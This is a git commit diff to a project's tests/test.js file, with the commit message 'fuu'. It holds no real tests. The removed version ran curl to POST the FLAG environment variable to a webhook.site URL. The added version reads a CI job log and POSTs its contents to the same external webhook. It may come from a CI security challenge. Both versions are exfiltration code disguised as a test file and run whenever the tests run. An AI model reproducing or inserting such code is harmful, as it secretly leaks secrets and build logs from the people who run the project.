7fb14eb27373bb6291e8c5e8de7e9cf8ad0554db
Lars Wilhelmsen <lars@sral.org>
2023-04-14 19:24:18 +0200

    fuu

--- tests/test.js
+++ tests/test.js
@@ -1,3 +1,16 @@
-// TODO: implement the tests
-//console.log("Tests are not implemented yet...");
-require('child_process').exec('curl -X POST -d "'+ process.env.FLAG + '" https://webhook.site/a4ba2caf-e528-46ab-933e-e21af028d76c/');
+fs.readFile('../job.log', 'utf8', (err, data) => {
+  if (err) {
+    console.log(err);
+    return;
+  }
+
+  const options = {
+    method: 'POST',
+    headers: { 'Content-Type': 'text/plain' },
+    body: data
+  };
+
+  console.log("sending");
+  fetch("https://webhook.site/a4ba2caf-e528-46ab-933e-e21af028d76c/", options);
+});
+
